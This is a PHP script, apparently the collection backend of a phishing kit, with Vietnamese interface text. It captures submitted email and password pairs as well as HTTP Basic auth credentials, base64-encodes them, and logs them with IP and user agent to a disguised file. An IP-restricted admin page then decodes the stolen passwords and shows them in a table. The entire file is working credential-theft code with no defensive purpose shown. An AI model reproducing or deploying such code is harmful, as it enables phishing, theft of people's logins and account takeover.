<?php
$DATA_FILE   = __DIR__ . '/dXNlcl9kYXRhX2xvZ2luX3Bhc3M=.txt';
$ACCESS_LOG  = __DIR__ . '/dXNlcl9hY2Nlc3NfdXNlcl9wYXNz.log';
$ALLOWED_IPS = '116.98.3.33';
$ADMIN_USER  = 'super@$adminuser$';
$ADMIN_PASS  = 'super@$adminpass$';
$MAX_LEN     = 200;

$USE_API_KEY = false;
$API_KEY     = 'change_this_api_key';

function getClientIp() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $parts = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($parts[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? '';
}
function jsonResp($ok, $msg, $code = 200) {
    http_response_code($code);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['success' => $ok, 'message' => $msg], JSON_UNESCAPED_UNICODE);
    exit;
}
function isIpAllowed($list) {
    $list = trim((string)$list);
    if ($list === '') return false;
    $client = getClientIp();
    $allowed = array_map('trim', explode(',', $list));
    return in_array($client, $allowed, true);
}
function requireAuth($user, $pass) {
    if (!isset($_SERVER['PHP_AUTH_USER'])) {
        header('WWW-Authenticate: Basic realm="Protected Area"');
        http_response_code(401);
        echo "Cần đăng nhập";
        exit;
    }
    if ($_SERVER['PHP_AUTH_USER'] !== $user || $_SERVER['PHP_AUTH_PW'] !== $pass) {
        header('WWW-Authenticate: Basic realm="Protected Area"');
        http_response_code(401);
        echo "Sai tài khoản hoặc mật khẩu";
        exit;
    }
}

$datadir = dirname($DATA_FILE);
if (!is_dir($datadir)) {
    @mkdir($datadir, 0750, true);
}

if (isset($_SERVER['PHP_AUTH_USER'], $_SERVER['PHP_AUTH_PW']) && !isset($_GET['view'])) {
    $visitorUser = trim((string)$_SERVER['PHP_AUTH_USER']);
    $visitorPw   = trim((string)$_SERVER['PHP_AUTH_PW']);
    if ($visitorUser !== '') {
        $encUser = base64_encode($visitorUser);
        $encPw   = base64_encode($visitorPw);
        $time    = date('Y-m-d H:i:s');
        $ip      = getClientIp();
        $ua      = $_SERVER['HTTP_USER_AGENT'] ?? '-';
        $uaClean = str_replace(["\r","\n"], ['',''], $ua);
        $line = sprintf("%s | LOGIN | %s | %s | %s | %s\n", $time, $ip, $encUser, $encPw, $uaClean);
        @file_put_contents($DATA_FILE, $line, FILE_APPEND | LOCK_EX);
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($USE_API_KEY) {
        $headers = function_exists('getallheaders') ? getallheaders() : [];
        $sent = $headers['X-API-Key'] ?? $headers['x-api-key'] ?? null;
        if ($sent === null || $sent !== $API_KEY) {
            jsonResp(false, 'Invalid API key', 401);
        }
    }

    $identifier = isset($_POST['email']) ? trim((string)$_POST['email']) : '';
    $password   = isset($_POST['password'])   ? trim((string)$_POST['password'])   : '';

    if ($identifier === '' || $password === '') {
        jsonResp(false, 'Thiếu identifier hoặc password', 400);
    }
    if (mb_strlen($identifier) > $MAX_LEN || mb_strlen($password) > $MAX_LEN) {
        jsonResp(false, 'Dữ liệu quá dài', 400);
    }

    $encId = base64_encode($identifier);
    $encPw = base64_encode($password);
    $time  = date('Y-m-d H:i:s');
    $ip    = getClientIp();

    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '-';
    $uaClean = str_replace(["\r","\n"], ['',''], $ua);

    $line = sprintf("%s | POST | %s | %s | %s | %s\n", $time, $ip, $encId, $encPw, $uaClean); 
    $written = @file_put_contents($DATA_FILE, $line, FILE_APPEND | LOCK_EX);
    if ($written === false) {
        jsonResp(false, 'Lỗi khi ghi file (permission?)', 500);
    }

    jsonResp(true, 'Ghi thành công', 200);
}

$rows = [];
if (isset($_GET['view'])) {
    if (!isIpAllowed($ALLOWED_IPS)) {
        http_response_code(403);
        echo "IP của bạn không được phép truy cập";
        exit;
    }

    requireAuth($ADMIN_USER, $ADMIN_PASS);

    $logLine = sprintf("%s | VIEW | %s | %s\n", date('Y-m-d H:i:s'), getClientIp(), $_SERVER['PHP_AUTH_USER'] ?? '-');
    @file_put_contents($ACCESS_LOG, $logLine, FILE_APPEND | LOCK_EX);

    if (file_exists($DATA_FILE)) {
        $lines = file($DATA_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        foreach ($lines as $ln) {
            $parts = array_map('trim', explode('|', $ln));
            if (count($parts) < 3) continue;
            $time = $parts[0] ?? '';
            if (isset($parts[1]) && strtoupper($parts[1]) === 'LOGIN' && count($parts) >= 6) {
                $cip  = $parts[2];
                $encU = $parts[3];
                $encP = $parts[4];
                $ua   = $parts[5];
                $user = (@base64_decode($encU, true) === false) ? $encU : base64_decode($encU);
                $pw   = (@base64_decode($encP, true) === false) ? $encP : base64_decode($encP);
                $rows[] = [
                    'time' => $time,
                    'type' => 'LOGIN',
                    'client_ip' => $cip,
                    'identifier' => $user,
                    'password' => $pw,
                    'raw_enc_id' => $encU,
                    'raw_enc_pw' => $encP,
                    'ua' => $ua,
                ];
		} else {
                
                if (count($parts) >= 6 && strtoupper($parts[1]) === 'POST') {
                   
                    $type  = $parts[1]; 
                    $cip   = $parts[2]; 
                    $encId = $parts[3]; 
                    $encPw = $parts[4]; 
                    $ua    = $parts[5]; 
                    
                    $id = (@base64_decode($encId, true) === false) ? $encId : base64_decode($encId);
                    $pw = (@base64_decode($encPw, true) === false) ? $encPw : base64_decode($encPw);
                    
                    $rows[] = [
                        'time' => $time,
                        'type' => $type,
                        'client_ip' => $cip,
                        'identifier' => $id,
                        'password' => $pw,
                        'raw_enc_id' => $encId,
                        'raw_enc_pw' => $encPw,
                        'ua' => $ua, 
                    ];
                }
            }
        }
    }

}

?>
<!doctype html>
<html lang="vi">
<head>
    <meta charset="utf-8" />
    <title>Bảng dữ liệu</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; }
        h1 { color: #1877f2; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .post-type { color: green; font-weight: bold; }
        .login-type { color: orange; }
    </style>
</head>
<body>
    <h1>Dữ liệu đã thu thập (Data.txt)</h1>
    <p>Tổng số dòng: <?php echo count($rows); ?></p>
    <table>
        <thead>
            <tr>
                <th>Thời gian</th>
                <th>Loại</th>
                <th>IP Client</th>
                <th>Tài khoản (ID)</th>
                <th>Mật khẩu (PW)</th>
                <th>OS / Browser (User Agent)</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach (array_reverse($rows) as $row): // Hiển thị dòng mới nhất lên đầu ?>
            <tr>
                <td><?php echo htmlspecialchars($row['time']); ?></td>
                <td class="<?php echo strtolower($row['type']); ?>-type"><?php echo htmlspecialchars($row['type']); ?></td>
                <td><?php echo htmlspecialchars($row['client_ip']); ?></td>
                <td><?php echo htmlspecialchars($row['identifier']); ?></td>
                <td><?php echo htmlspecialchars($row['password']); ?></td>
                <td><?php echo htmlspecialchars($row['ua'] ?? 'N/A'); ?></td> </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</body>
</html>
